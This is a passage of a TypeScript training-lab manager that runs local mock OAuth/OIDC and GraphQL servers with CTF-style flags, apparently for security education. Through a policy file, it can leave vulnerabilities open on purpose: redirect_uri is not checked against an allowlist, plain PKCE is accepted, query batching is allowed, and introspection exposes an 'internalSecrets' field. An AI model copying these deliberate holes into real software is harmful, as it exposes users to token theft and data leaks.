          policy = { ...policy, ...JSON.parse(readFileSync(path.join(wsRoot, "lab-policy.json"), "utf8")) }
        } catch {
          // Default
        }

        if (u.pathname === "/.well-known/openid-configuration") {
          const host = req.headers.host || "127.0.0.1"
          return send(200, {
            issuer: `http://${host}`,
            authorization_endpoint: `http://${host}/oauth/authorize`,
            token_endpoint: `http://${host}/oauth/token`,
            response_types_supported: policy.requirePkceS256 ? ["code"] : ["code", "token"],
            code_challenge_methods_supported: policy.requirePkceS256 ? ["S256"] : ["plain", "S256"],
          })
        }

        if (u.pathname === "/oauth/authorize") {
          const redirectUri = u.searchParams.get("redirect_uri") || ""
          const challengeMethod = u.searchParams.get("code_challenge_method") || ""
          if (policy.requirePkceS256 && challengeMethod !== "S256") {
            return send(400, { error: "invalid_request", error_description: "PKCE S256 required" })
          }
          if (policy.strictRedirectUriAllowlist) {
            const allowed = policy.allowedRedirectOrigins.some((orig) => redirectUri.startsWith(orig))
            if (!allowed) {
              return send(400, { error: "invalid_redirect_uri", error_description: "redirect_uri outside allowlist" })
            }
          }
          if (redirectUri) {
            stateRef.record(method, rawUrl, 302)
            res.writeHead(302, { Location: `${redirectUri}?code=lab_auth_code_991` })
            res.end()
            return
          }
          return send(200, { status: "oauth_authorize_ready", policy })
        }

        if (u.pathname === "/graphql" && method === "POST") {
          const chunks: Buffer[] = []
          req.on("data", (c: Buffer) => chunks.push(c))
          req.on("end", () => {
            try {
              const parsed = JSON.parse(Buffer.concat(chunks).toString("utf8")) as unknown
              if (Array.isArray(parsed)) {
                if (!policy.allowBatchQueries) {
                  return send(400, { errors: [{ message: "GraphQL query batching is disabled by lab-policy.json" }] })
                }
                return send(
                  200,
                  parsed.map(() => ({ data: { __typename: "Query", flag: "LAB{GRAPHQL_BATCHING_ENABLED}" } })),
                )
              }
              const q = String((parsed as { query?: string })?.query || "")
              if (q.includes("__schema") || q.includes("__type")) {
                if (!policy.allowIntrospection) {
                  return send(403, { errors: [{ message: "GraphQL introspection is disabled" }] })
                }
                return send(200, {
                  data: {
                    __schema: {
                      queryType: { name: "Query" },
                      types: [
                        { name: "Query", fields: [{ name: "me" }, { name: "internalSecrets" }] },
                        { name: "User", fields: [{ name: "id" }, { name: "email" }, { name: "role" }] },
                      ],
                    },
                  },
                })
              }
              return send(200, { data: { me: { id: "u-1", email: "curator@cyberlab.local", role: "researcher" } } })
            } catch {
              return send(400, { errors: [{ message: "Invalid JSON GraphQL body" }] })
            }
          })
          return
        }

        return send(200, { labId, status: "online", policy, endpoints: ["/graphql", "/.well-known/openid-configuration", "/oauth/authorize"] })
      }

      if (labId === "lab-keyhunter-supply-chain") {
        if (u.pathname === "/" || u.pathname === "/index.html") {
          return send(
            200,
            `<!doctype html><html><head><title>Supply Chain & Key Hunter Training Lab</title><script src="/static/app.bundle.js"></script></head><body><h1>Staging Portal</h1></body></html>`,
            { "Content-Type": "text/html; charset=utf-8" },
          )
        }
        if (u.pathname === "/static/app.bundle.js") {
          const jsPath = path.join(wsRoot, "public", "static", "app.bundle.js")
          const jsText = existsSync(jsPath) ? readFileSync(jsPath, "utf8") : "// bundle missing"
          return send(200, jsText, { "Content-Type": "application/javascript; charset=utf-8" })
        }
        return send(404, { error: "Not found" })
      }

      return send(200, { labId, status: "online" })
    }
  }

  async startLab(params: { labId: string; preferredPort?: number; resetFiles?: boolean }): Promise<TrainingLabStatus> {
    const def = BUILTIN_TRAINING_LABS.find((l) => l.labId === params.labId)
    if (!def) {
      throw new Error(`Unknown training lab "${params.labId}". Available: ${BUILTIN_TRAINING_LABS.map((l) => l.labId).join(", ")}`)
    }

    const wsRoot = this.getLabWorkspacePath(def.labId)
    if (params.resetFiles || !existsSync(path.join(wsRoot, "LAB_BRIEFING.md"))) {
      this.writeLabFiles(def.labId, wsRoot)
    }

    if (!def.hasLiveServer) {
      return this.getLabStatus(def.labId)
    }

    const existing = this.runningServers.get(def.labId)
    if (existing) {
      return this.getLabStatus(def.labId)
    }

    const recentRequests: Array<{ timestamp: string; method: string; url: string; statusCode: number }> = []
    let requestCount = 0
    const tracker = {
      record(method: string, url: string, statusCode: number) {
        requestCount += 1
        recentRequests.push({ timestamp: new Date().toISOString(), method, url, statusCode })
        if (recentRequests.length > 30) recentRequests.shift()
        const cur = stateObj
        if (cur) {
          cur.requestCount = requestCount
          cur.recentRequests = recentRequests
        }
      },
    }

    const handler = this.createHttpHandlerForLab(def.labId, wsRoot, tracker)
    let stateObj: RunningLabServerState | null = null

    const listenOn = (port: number) =>
      new Promise<{ server: http.Server; port: number }>((resolve, reject) => {
        const srv = http.createServer(handler)
        srv.once("error", (err) => reject(err))
        srv.listen(port, "127.0.0.1", () => {
          const addr = srv.address() as AddressInfo
          resolve({ server: srv, port: addr.port })
        })
      })

    let bound: { server: http.Server; port: number }
    const requestedPort = params.preferredPort ?? def.defaultPortHint ?? 0
    try {
      bound = await listenOn(requestedPort)
    } catch {
      bound = await listenOn(0)
    }

    stateObj = {
      server: bound.server,
      port: bound.port,
      baseUrl: `http://127.0.0.1:${bound.port}`,
      startedAt: new Date().toISOString(),
      requestCount: 0,
      recentRequests,
    }
    this.runningServers.set(def.labId, stateObj)

    // v6.4: gera imediatamente o Kit de Investigação (Fases B/D/F) já com a porta REAL
    if (buildLabInvestigationKit(def.labId, bound.port)) {
      writeLabInvestigationKit(def.labId, wsRoot, bound.port)
    }

    return this.getLabStatus(def.labId)
  }

  /**
   * v6.4 — Garante que o Kit de Investigação existe (mesmo sem subir o servidor).
   * Usa a porta real se o lab já estiver rodando; caso contrário, o hint do catálogo.
   */
  ensureInvestigationKit(labId: string): string[] | null {
    const def = BUILTIN_TRAINING_LABS.find((l) => l.labId === labId)
    if (!def) throw new Error(`Unknown training lab "${labId}"`)
    const wsRoot = this.getLabWorkspacePath(labId)
    const running = this.runningServers.get(labId)
    const port = running?.port ?? def.defaultPortHint ?? null
    const files = writeLabInvestigationKit(labId, wsRoot, port)
    return files ? Object.values(files) : null
  }

  hasInvestigationKit(labId: string): boolean {
    return labInvestigationKitExists(this.getLabWorkspacePath(labId))
  }

  /** Patch pronto para `CyberLabKnowledgeEngine.updateInvestigationMemory()`. */
  buildInvestigationMemorySeed(labId: string) {
    const def = BUILTIN_TRAINING_LABS.find((l) => l.labId === labId)
    if (!def) throw new Error(`Unknown training lab "${labId}"`)
    const running = this.runningServers.get(labId)
    const kit = buildLabInvestigationKit(labId, running?.port ?? def.defaultPortHint ?? null)
    if (!kit) return null
    return buildMemorySeed(kit)
  }

  async resetLab(labId: string): Promise<TrainingLabStatus> {
    const def = BUILTIN_TRAINING_LABS.find((l) => l.labId === labId)
    if (!def) {
      throw new Error(`Unknown training lab "${labId}"`)
    }
    const wsRoot = this.getLabWorkspacePath(def.labId)
    this.writeLabFiles(def.labId, wsRoot)
    const running = this.runningServers.get(def.labId)
    if (buildLabInvestigationKit(def.labId, running?.port ?? def.defaultPortHint ?? null)) {
      writeLabInvestigationKit(def.labId, wsRoot, running?.port ?? def.defaultPortHint ?? null)
    }
    return this.getLabStatus(def.labId)
  }

  async stopLab(labId: string): Promise<TrainingLabStatus> {
    const existing = this.runningServers.get(labId)
    if (existing) {
      await new Promise<void>((resolve) => existing.server.close(() => resolve()))
      this.runningServers.delete(labId)
    }
    return this.getLabStatus(labId)
  }

  async stopAll(): Promise<void> {
    const ids = [...this.runningServers.keys()]
    for (const id of ids) {
      await this.stopLab(id)
    }
  }
}
